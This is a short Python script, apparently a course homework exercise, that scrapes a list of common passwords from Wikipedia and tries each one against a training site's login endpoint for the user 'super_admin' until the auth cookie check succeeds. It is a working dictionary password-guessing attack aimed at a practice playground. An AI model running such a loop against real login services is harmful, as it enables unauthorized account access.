import requests
from bs4 import BeautifulSoup


login = "super_admin"

# Parsing list of the most common passwords from Wikipedia
wiki_passwords = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
soup = BeautifulSoup(wiki_passwords.text, 'lxml')
wiki_table = soup.select_one("table:nth-of-type(2)")
passwords_list = []
for td in wiki_table.find_all('td', align='left'):
    td_value = td.get_text()
    td_text = td_value.strip()
    passwords_list.append(td_text)

# Getting a set of unique passwords
unique_passwords = set(passwords_list)

url_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

count = 0
for password in unique_passwords:
    response_cookie = requests.post(url_cookie, data={"login": login, "password": password})
    cookies = response_cookie.cookies
    response_check = requests.post(url_check, cookies=cookies)
    if response_check.text == "You are NOT authorized":
        count += 1
        continue
    else:
        print(f"{response_check.text}")
        print(f"The password is {password}")
        break

if count == len(unique_passwords):
    print("The correct password was not found.")
